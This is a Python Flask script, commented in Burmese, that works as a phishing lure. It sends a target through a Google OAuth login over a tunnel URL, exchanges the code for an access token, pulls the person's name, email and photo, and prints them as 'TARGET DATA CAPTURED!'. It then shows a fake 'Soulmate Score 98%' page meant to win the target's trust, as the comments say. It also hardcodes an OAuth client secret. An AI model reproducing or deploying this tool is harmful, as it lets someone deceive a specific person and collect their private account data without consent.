from flask import Flask, redirect, url_for, request
import requests

app = Flask(__name__)

CLIENT_ID = "1067906653409-dsmhmumlp914dcihc7ob94m3fsms2kpg.apps.googleusercontent.com"
CLIENT_SECRET = "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"
REDIRECT_URI = "https://2b2d1f37e1a471.lhr.life/callback"

@app.route('/')
def index():
    scope = "https://www.googleapis.com/auth/userinfo.profile https://www.googleapis.com/auth/userinfo.email"
    auth_url = (f"https://accounts.google.com/o/oauth2/v2/auth?client_id={CLIENT_ID}"
                f"&redirect_uri={REDIRECT_URI}&response_type=code&scope={scope}")
    return redirect(auth_url)

@app.route('/callback')
def callback():
    # Login ဝင်ပြီးရင် ကျလာမယ့် Code ကို ယူပြီး Profile အချက်အလက် တောင်းမယ်
    code = request.args.get('code')
    token_url = "https://oauth2.googleapis.com/token"
    data = {
        'code': code,
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'redirect_uri': REDIRECT_URI,
        'grant_type': 'authorization_code'
    }
    
    # Access Token ယူခြင်း
    r = requests.post(token_url, data=data)
    access_token = r.json().get('access_token')
    
    # Profile အချက်အလက် ယူခြင်း (Email, Name, Profile Picture စတာတွေ ရလာမယ်)
    user_info = requests.get("https://www.googleapis.com/oauth2/v2/userinfo", 
                             headers={"Authorization": f"Bearer {access_token}"})
    
    # ရရှိလာတဲ့ အချက်အလက်ကို Terminal မှာ ပြပေးမယ် (ဒါက ငါတို့ လိုချင်တဲ့ ရလဒ်ပဲ)
    print("\n" + "="*50)
    print("TARGET DATA CAPTURED!")
    print(user_info.text)
    print("="*50 + "\n")
    
    # Target မြင်ရမယ့် Fake Page (သူမကို ယုံကြည်သွားအောင် လုပ်တဲ့စာသား)
    return """
    <html>
    <body style="text-align: center; font-family: sans-serif; padding-top: 50px;">
        <h1 style="color: #ff4d4d;">❤️ Your Soulmate Score is 98%! ❤️</h1>
        <p>Litmatch Database analyzed your profile and matched it with the requester.</p>
        <p style="color: #666;">(Verification Successful)</p>
    </body>
    </html>
    """

if __name__ == '__main__':
    # စက်ထဲမှာ Port 5000 နဲ့ ပတ်မယ်
    app.run(port=5000, debug=True)
